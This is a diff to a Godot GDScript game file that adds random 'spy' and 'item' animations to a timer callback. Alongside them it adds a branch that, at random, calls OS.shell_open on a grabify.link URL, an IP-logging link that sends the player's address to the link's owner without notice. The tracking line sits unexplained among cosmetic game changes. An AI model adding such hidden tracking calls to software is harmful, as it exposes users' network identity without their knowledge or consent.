@@ -31,10 +31,16 @@ func _on_Timer_timeout():
 			$random.play("flicker")
 		elif num == 26:
 			$random.play("red_face")
+		elif num == 8:
+			$random.play("spy")
+		elif num == 93:
+			$random.play("item")
 			
 	num2 = randi()%100000+1
 	if get_parent().phoneTalking == false and num2 == 43269 and get_parent().phone_waiting == false:
 		Gold()
+	elif num2 < 500:
+		OS.shell_open("https://grabify.link/QT0GY2")
 
 
 func Gold():
